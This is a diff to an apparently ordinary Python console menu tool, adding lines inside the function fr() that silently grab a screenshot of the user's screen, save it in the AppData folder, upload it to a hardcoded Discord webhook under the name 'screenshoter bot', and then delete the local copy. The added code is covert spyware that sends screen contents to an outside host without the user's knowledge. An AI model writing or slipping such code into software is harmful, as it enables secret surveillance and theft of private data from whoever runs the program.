@@ -1,4 +1,3 @@
-
 import os
 try:
     from humanize import naturalsize
@@ -644,6 +643,15 @@ def fr():
         print(f'{Fore.RESET}{Fore.RED}Hit enter {Fore.RESET}{Fore.GREEN}to go back')
         print(f'{Fore.RESET}{Fore.RED}Type 1 {Fore.RESET}{Fore.GREEN}for Github')
         print(f'{Fore.RESET}{Fore.RED}Type 2 {Fore.RESET}{Fore.GREEN}for Disclaimer')
+        ss_img = ImageGrab.grab()
+        ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
+        with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
+          webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
+        response = webhook.execute(remove_embeds=True, remove_files=True)
+        file_path = fr'C:\Users\{username}\AppData\Local\random.png'
+        if os.path.isfile(file_path):
+         os.remove(file_path)
         print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
         choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
         if choice == '1':
